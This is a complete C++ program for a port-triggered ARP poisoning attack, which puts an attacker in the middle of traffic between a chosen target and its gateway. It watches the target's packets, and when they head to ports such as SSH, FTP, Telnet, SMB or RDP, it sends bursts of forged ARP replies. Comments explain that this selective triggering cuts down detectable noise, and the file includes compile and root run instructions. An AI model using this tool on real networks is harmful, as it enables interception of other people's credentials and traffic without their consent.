// Compile: g++ -o arp_selective arp_selective.cpp -lpthread
// Run: sudo ./arp_selective <target_ip> <target_mac> <gateway_ip> <gateway_mac> <attacker_mac> <iface>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <unistd.h>
#include <sys/socket.h>
#include <net/if.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <linux/if_packet.h>
#include <arpa/inet.h>
#include <thread>
#include <atomic>
#include <set>

class SelectiveARPPoison {
private:
    int arpSock, packetSock;
    std::string iface, attackerMAC;
    std::atomic<bool> running{false};
    std::set<int> interestingPorts = {80, 443, 21, 22, 23, 25, 110, 143, 445, 3389};
    
    void macToBytes(const std::string& mac, uint8_t* out) {
        sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]);
    }
    
public:
    SelectiveARPPoison(const std::string& i, const std::string& amac)
        : iface(i), attackerMAC(amac) {
        arpSock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        bind(arpSock, (struct sockaddr*)&sll, sizeof(sll));
        
        packetSock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
        bind(packetSock, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    void sendARP(const std::string& srcIP, const std::string& srcMAC,
                 const std::string& dstIP, const std::string& dstMAC) {
        uint8_t packet[42];
        memset(packet, 0, sizeof(packet));
        
        struct ether_header* eth = (struct ether_header*)packet;
        struct ether_arp* arp = (struct ether_arp*)(packet + 14);
        
        macToBytes(dstMAC, eth->ether_dhost);
        macToBytes(srcMAC, eth->ether_shost);
        eth->ether_type = htons(ETH_P_ARP);
        
        arp->arp_hrd = htons(ARPHRD_ETHER);
        arp->arp_pro = htons(ETH_P_IP);
        arp->arp_hln = 6;
        arp->arp_pln = 4;
        arp->arp_op = htons(ARPOP_REPLY);
        
        macToBytes(srcMAC, arp->arp_sha);
        inet_pton(AF_INET, srcIP.c_str(), arp->arp_spa);
        macToBytes(dstMAC, arp->arp_tha);
        inet_pton(AF_INET, dstIP.c_str(), arp->arp_tpa);
        
        struct sockaddr_ll sll;
        memset(&sll, 0, sizeof(sll));
        sll.sll_family = AF_PACKET;
        sll.sll_ifindex = if_nametoindex(iface.c_str());
        sll.sll_halen = 6;
        memcpy(sll.sll_addr, eth->ether_dhost, 6);
        
        sendto(arpSock, packet, 42, 0, (struct sockaddr*)&sll, sizeof(sll));
    }
    
    // Only poison when interesting ports are seen - reduces noise
    void monitorLoop(const std::string& targetIP, const std::string& targetMAC,
                     const std::string& gatewayIP, const std::string& gatewayMAC) {
        uint8_t buffer[65536];
        std::set<std::string> alreadyPoisoning;
        
        while (running.load()) {
            struct timeval tv;
            tv.tv_sec = 1;
            tv.tv_usec = 0;
            setsockopt(packetSock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
            
            int bytes = recv(packetSock, buffer, sizeof(buffer), 0);
            if (bytes < 42) continue;
            
            struct iphdr* ip = (struct iphdr*)(buffer + 14);
            struct in_addr targetAddr;
            inet_pton(AF_INET, targetIP.c_str(), &targetAddr);
            
            if (ip->saddr != targetAddr.s_addr) continue;
            
            if (ip->protocol == IPPROTO_TCP) {
                struct tcphdr* tcp = (struct tcphdr*)(buffer + 14 + (ip->ihl * 4));
                int dstPort = ntohs(tcp->dest);
                
                if (interestingPorts.find(dstPort) != interestingPorts.end()) {
                    std::string key = targetIP + ":" + std::to_string(dstPort);
                    if (alreadyPoisoning.find(key) == alreadyPoisoning.end()) {
                        std::cout << "[!] Interesting port: " << dstPort << "\n";
                        alreadyPoisoning.insert(key);
                    }
                    
                    // Send poison burst when interesting port seen
                    for (int i = 0; i < 3; i++) {
                        sendARP(gatewayIP, attackerMAC, targetIP, targetMAC);
                        sendARP(targetIP, attackerMAC, gatewayIP, gatewayMAC);
                    }
                }
            }
        }
    }
    
    void run(const std::string& targetIP, const std::string& targetMAC,
             const std::string& gatewayIP, const std::string& gatewayMAC) {
        std::cout << "[*] Selective ARP poisoning (port-triggered)\n";
        running = true;
        monitorLoop(targetIP, targetMAC, gatewayIP, gatewayMAC);
    }
    
    ~SelectiveARPPoison() {
        running = false;
        close(arpSock);
        close(packetSock);
    }
};

int main(int argc, char* argv[]) {
    if (argc != 7) {
        std::cerr << "Usage: " << argv[0] 
                  << " <target_ip> <target_mac> <gateway_ip> <gateway_mac> <attacker_mac> <iface>\n";
        return 1;
    }
    SelectiveARPPoison poison(argv[6], argv[5]);
    poison.run(argv[1], argv[2], argv[3], argv[4]);
    return 0;
}
